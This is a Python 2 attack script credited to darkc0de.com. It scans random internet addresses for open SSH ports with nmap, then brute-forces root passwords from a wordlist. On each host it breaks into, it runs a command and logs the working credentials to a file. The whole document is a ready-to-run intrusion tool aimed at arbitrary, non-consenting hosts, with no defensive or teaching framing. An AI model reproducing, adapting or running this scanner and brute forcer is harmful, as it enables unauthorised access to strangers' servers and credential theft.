#!/usr/bin/python
#SSH BruteForcer that scans for random
#open ssh ports using nmap and then brute 
#forces them.

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, time, StringIO, commands, re

#Set the successful login file.
save_file = "SSH_Logins.txt"
#Set verbose mode: 1=on 0=off
verbose = 1
#Set the user to use.
user = "root"

try:
	import pexpect, pxssh
except(ImportError):
	print "\nYou need the pexpect module."
	print "http://www.noah.org/wiki/Pexpect\n"
	sys.exit(1)
	
def scan():
	args = 'nmap -iR 1 -p 22 -open | grep open -B 3'
	nmap = StringIO.StringIO(commands.getstatusoutput(args)[1]).read()
	ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", nmap)
	if ipaddr:
	    	return ipaddr[0]

def brute(ip, word):
	if verbose != 0:
		print "Trying:",word
     	try:
        	s = pxssh.pxssh()
        	s.login (ip, user, word, login_timeout=10)
        	s.sendline (command)
        	s.prompt()
        	print "\n",s.before
        	s.logout()
		print "\t[!] Login Success:",user, word,"\n"
		logins.writelines("SSH Login:"+ip+":22 "+user+" "+word+"\n")
   	except Exception, e:
        	#print "[-] Failed"
		pass
	except KeyboardInterrupt:
		print "\n[-] Quit\n"
		logins.close()
		sys.exit(1)

print "\n\t   d3hydr8:darkc0de.com sshBrute/Random v1.0"
print "\t----------------------------------------------"
	
if len(sys.argv) != 3:
	print "\nUsage : ./sshbrute_random.py <how many> <wordlist>"
	print "Eg: ./sshbrute_random.py 1000 words.txt\n"
	sys.exit(1)

num = sys.argv[1]
command = 'uname -a'
logins = open(save_file, "a")

try:
	words = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n[+] Loaded:",len(words),"words"
print "[+] User:",user
print "[+] Save file:",save_file
if verbose != 0:
	print "[+] Verbose Mode: On"
else:
	print "[+] Verbose Mode: Off"
print "[+] Scanning:",num,"ips\n"

for x in xrange(int(num)):
	print "[-] Scanning:",x+1,"of",num
	ip = scan()
	if ip != None:
		print "\n\t[+] BruteForcing:",ip,"\n"
		for word in words:
			#Change this time if needed
			time.sleep(0.5)
			brute(ip, word.replace("\n",""))
logins.close()
print "\n[-] Done\n"
